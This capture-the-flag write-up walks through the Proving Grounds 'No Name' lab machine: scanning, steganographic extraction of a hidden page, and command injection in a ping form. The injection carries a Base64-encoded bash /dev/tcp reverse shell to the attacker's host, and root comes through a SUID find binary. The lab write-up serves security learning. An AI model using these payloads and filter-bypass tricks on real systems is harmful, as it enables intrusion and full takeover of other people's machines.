---
layout: default
title: No Name
parent: Proving Grounds Play
nav_order: 18
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/noname]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.160.15
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 22:57 EST
Nmap scan report for 192.168.160.15
Host is up (0.058s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

```

# Enumeration

---

## 80 | HTTP

### Directory Busting

WFUZZ discovers _/admin_

![admin](../../../assets/images/ctfs/proving_grounds/noname/admin.png)

There is text at the bottom of the screen, maybe a password.

![passphrase](../../../assets/images/ctfs/proving_grounds/noname/passphrase.png)

Possible password: harder
{: .warn }

After downloading the 4 images from _/admin_ we run _steghide_ against them with the _harder_ passphrase.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/noname]
└─$ steghide extract -sf haclabs.jpeg --passphrase harder
wrote extracted data to "imp.txt".

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/noname]
└─$ ls
ctf-01.jpg  haclabs.jpeg  imp.txt  new.jpg  Short.png

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/noname]
└─$ cat imp.txt
c3VwZXJhZG1pbi5waHA=
```

Decoded the Base64 encoded string and reveal _superadmin.php_

Navigating the _superadmin.php_ reveals another page with a ping query text field.

We send a ping to _localhost_ and get feedback to the screen that it was successful.

![ping](../../../assets/images/ctfs/proving_grounds/noname/ping.png)

If we pipe the localhost to _whoami_ it executes the command so we have command injection.

# Exploitation

---

Before we can get a reverse shell on this target, we need to see which bad characters are not allowed by _superadmin.php_

Let's intercept _cat superadmin.php_ in Burp.

![ping](../../../assets/images/ctfs/proving_grounds/noname/ping.png)

We can see that many of the terms/words used in netcat or bash reverse shells are not being allowed.

We should be able to encode our reverse shell one-liner with base64 to get around this check.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/noname]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t bash

[+] Reverse shell command:

bash -i >& /dev/tcp/192.168.45.217/9001 0>&1

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/noname]
└─$ echo "bash -i >& /dev/tcp/192.168.45.217/9001 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxNy85MDAxIDA+JjEK

```

Run the following in the ping query field

```bash
Query: localhost | echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxNy85MDAxIDA+JjEK" | base64 -d | bash
```

We get a reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/noname]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.160.15] 60262
bash: cannot set terminal process group (893): Inappropriate ioctl for device
bash: no job control in this shell
www-data@haclabs:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Enumerate Users

Located the users _haclabs_ and _yash_

## Check SUID Permissions

```bash
www-data@haclabs:/home/haclabs$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/find
/usr/bin/gpasswd
/usr/bin/chfn
```

We can exploit the _/usr/bin/find_ binary.

![suid](../../../assets/images/ctfs/proving_grounds/noname/suid.png)

```bash
www-data@haclabs:/home/haclabs$ /usr/bin/find . -exec /bin/sh -p \; -quit
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
root

```
